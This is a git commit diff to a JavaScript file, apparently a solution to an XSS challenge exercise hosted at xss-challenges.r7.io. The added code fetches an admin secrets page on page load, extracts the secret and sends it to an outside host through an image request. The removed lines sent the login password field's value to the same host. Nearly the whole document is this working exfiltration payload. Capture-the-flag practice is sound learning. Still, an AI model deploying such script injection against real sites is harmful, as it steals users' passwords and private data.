e616ecb4de2fdd5b36ec391ca5d805d2da2a86a7
dlee20013 <dlee20013@gmail.com>
2017-04-25 04:01:45 -0700

    h

--- part4/part_4.js
+++ part4/part_4.js
@@ -1,17 +1,15 @@
 document.addEventListener("DOMContentLoaded", function() {
 	
-	alert(0);
 	var prob = document.getElementsByClassName("problem")[0];
 	var err = document.getElementsByClassName("error-message")[0];
 	prob.parentNode.removeChild(prob);
 	err.parentNode.removeChild(err);
-	alert(1);
 	$.ajax({url:"http://xss-challenges.r7.io/admin/secrets", success: function(hello){
-		alert(hello);
+		var secret = $.parseHTML(hello)[1].innerHTML;
+		var img = new Image();
+		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(secret);
+		console.log(img);
+		alert(secret);
 	}});
-	var img = new Image();
-	img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.getElementById("login_password").value);
-	console.log(img);
-	alert(2);
 });
 
